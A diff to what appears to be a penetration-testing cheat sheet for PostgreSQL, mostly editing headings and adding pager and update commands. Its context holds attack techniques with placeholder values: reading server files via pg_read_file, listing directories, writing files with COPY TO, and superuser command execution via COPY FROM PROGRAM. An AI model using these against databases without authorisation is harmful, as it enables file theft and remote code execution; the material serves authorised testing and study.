@@ -15,43 +15,53 @@ psql -h <TARGET> -U <USER> -p <PORT> -d <DB_NAME>
 ```
 
 ```console
-psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>'
+psql 'postgresql://<USER>:<PASSWORD>@<TARGET>:5432/<DB_NAME>'
 ```
 
 ### General
 
 ```console
-# Show Databases
+# Show databases
 \list
 ```
 
 ```console
-# Use Database
+# Use database
 \connect <DB_NAME>
 ```
 
 ```console
-# Show Tables
+# Show tables
 \dt
 ```
 
 ```console
-# Dump from Table
+# Disable pager
+\pset pager 0
+```
+
+```console
+# Dump from table
 select * from "<TABLE_NAME>";
 ```
 
 ```console
-# Insert into Table
-insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ("<VALUE_1>', '<VALUE_2>');
+# Insert into table
+insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ('<VALUE_1>', '<VALUE_2>');
 ```
 
 ```console
-# Write Text
+# Update table
+update "<TABLE_NAME>" set <COLUMN_1> = '<VALUE_1>' where <COLUMN_2> = '<VALUE_2>';
+```
+
+```console
+# Write text
 copy (select '<STRING>') to '<TARGET_PATH>';
 ```
 
 ```console
-# List All User Accounts
+# List all user accounts
 \du+
 ```
 
@@ -65,12 +75,12 @@ copy (select '<STRING>') to '<TARGET_PATH>';
 ### File Read
 
 ```console
-# List Directory
+# List directory
 SELECT * FROM pg_ls_dir('<DIR_PATH>');
 ``` 
 
 ```console
-# File Read
+# File read
 SELECT pg_read_file('<FILE_PATH>', 0, 4096);
 ```
 
@@ -79,17 +89,17 @@ SELECT pg_read_file('<FILE_PATH>', 0, 4096);
 ### RCE
 
 ```console
-# Only for Superuser
+# Only for superuser
 CREATE TABLE IF NOT EXISTS exec(string text);
 ```
 
 ```console
-# Code Execution
+# Code execution
 COPY exec FROM PROGRAM '<CMD>';
 ```
 
 ```console
-# Check Ouput
+# Check ouput
 SELECT * FROM exec;
 ```
 
